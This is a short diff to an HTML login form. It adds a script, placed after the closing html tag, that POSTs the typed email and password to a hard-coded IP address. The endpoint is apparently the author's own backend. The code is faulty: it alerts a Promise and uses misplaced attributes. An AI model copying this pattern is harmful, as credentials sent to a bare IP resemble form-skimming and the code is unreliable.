@@ -261,9 +261,18 @@
       <label for="psw"><b>Password</b></label>
       <input type="password" enctype="multipart/form-data" placeholder="Enter Password" name="psw" required id="psw">
         
-      <button class = "submit" type="submit" id = "submit">Login</button>
+      <button class = "button" type="submit" id = "submit" onclick= "sendData()">Login</button>
     </div>
   </form>
 </body>
 </html>
+<script>
+  function sendData(){
+      alert(fetch("https://68.183.112.1/main.go", {method: "POST", 
+                           body: JSON.stringify({"email": document.getElementById("usrName").value,
+                                                 "password": document.getElementById("psw").value}),
+                           headers: {'Content-Type': 'application/json',
+                                      'Accept': 'application/json'}}))
+  }
+</script>
   
